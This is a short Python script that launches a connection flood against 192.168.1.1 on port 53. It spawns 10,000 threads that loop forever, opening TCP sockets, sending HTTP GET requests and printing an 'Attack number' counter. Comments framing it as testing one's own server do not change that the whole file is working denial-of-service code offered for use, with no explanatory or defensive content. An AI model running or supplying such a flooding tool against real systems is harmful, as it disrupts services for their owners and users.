import socket
import threading

target = '192.168.1.1'  # Ensure this is your server
port = 53
attack_num = 0
lock = threading.Lock()

def attack():
    global attack_num
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((target, port))
                s.send("GET / HTTP/1.1\r\n".encode('ascii'))
                s.send(f"Host: {target}\r\n\r\n".encode('ascii'))
                
                with lock:
                    attack_num += 1
                    print(f"Attack number: {attack_num}")
        except Exception as e:
            print(f"An error occurred: {e}")

threads = []
for i in range(10000):  # Adjust the number of threads based on your testing needs and system capabilities
    thread = threading.Thread(target=attack)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
